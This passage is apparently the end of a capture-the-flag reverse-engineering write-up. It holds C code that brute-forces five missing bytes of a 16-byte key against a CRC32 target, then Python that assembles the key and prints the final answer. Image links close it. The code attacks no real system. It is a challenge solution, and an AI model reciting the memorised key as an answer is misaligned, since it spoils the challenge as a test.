0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D, 0x7F5E79B7, 0x00000000
};

void start_rand2( unsigned char x[] )
{
 unsigned int v18, v19, v20, v16;
 for ( int i = 0; i < 16; i++ )
 {
  for ( int j = 0; j < 16; j++ )
  {
   for ( int k = 0; k < 16; k++ )
   {
    for ( int l = 0; l < 16; l++ )
    {
     for ( int m = 0; m < 16; m++ )
     {
      unsigned char key[] = { 0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB };
      key[i] = x[0];
      key[j] = x[1];
      key[k] = x[2];
      key[l] = x[3];
      key[m] = x[4];
      v16 = 0xffffffff;
      for ( int cnt = 0; cnt < 0x10; cnt += 4 )
      {
       v18 = crc32_table[(unsigned char) (v16 ^ key[cnt])] ^ (v16>> 8);
       v19 = crc32_table[(unsigned char) (v18 ^ key[cnt + 1])] ^ (v18 >> 8);
       v20 = crc32_table[(unsigned char) (v19 ^ key[cnt + 2])] ^ (v19 >> 8);
       v16 = crc32_table[(unsigned char) (v20 ^ key[cnt + 3])] ^ (v20 >> 8);
      }
      if ( ~v16 == 0x7F5E79B7 )
      {
       printf( "found: %d %d %d %d %dn", i, j, k, l, m );
      }
     }
    }
   }
  }
 }
}

int main( void )
{
 unsigned char x[] = { 237, 247, 252, 137, 206 };
 start_rand2(x);
 return(0);
}
key = [0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB]
index = [2, 9, 10, 14, 5]
data = [237, 247, 252, 137, 206]

for i in range(5):
    key[index[i]] = data[i]

for i in range(16):
    print(format(key[i], '02x'), end='')

# 1bb1edfd19ce898c09f7fcd74ab389eb
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715594143.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1715594145.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1715594147.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1715594149.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1715594151.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1715594153.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1715594155.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1715594157.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1715594159.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1715594161.png)